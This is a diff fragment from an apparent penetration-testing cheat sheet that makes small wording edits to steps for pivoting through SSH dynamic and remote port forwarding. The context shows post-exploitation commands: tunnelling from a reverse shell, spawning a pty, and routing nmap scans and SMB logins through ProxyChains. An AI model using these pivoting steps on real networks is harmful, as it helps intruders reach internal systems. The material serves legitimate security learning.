@@ -3652,7 +3652,7 @@ See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/aca
 #### SSH Dynamic Port Forwarding
 1. From the reverse shell, run `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
 2. Now we must direct our tools to use this proxy with ProxyChains
-   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it `socks5  <IP-reverse-shell> <port to bind to>`
+   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy `socks5  <IP-reverse-shell> <port to bind to>`
 3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
    - Example with nmap: `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <IP>`
    - Example with SMB: `proxychains smbclient -L //<IP>/ -U <username> --password=<password>`
@@ -3667,7 +3667,7 @@ See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/aca
 #### SSH Remote Dynamic Port Forwarding
 1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
    - `[username@address]` of your local ssh
-2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
+2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy (`socks5  127.0.0.1 <PORT>`).
 3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
 
 
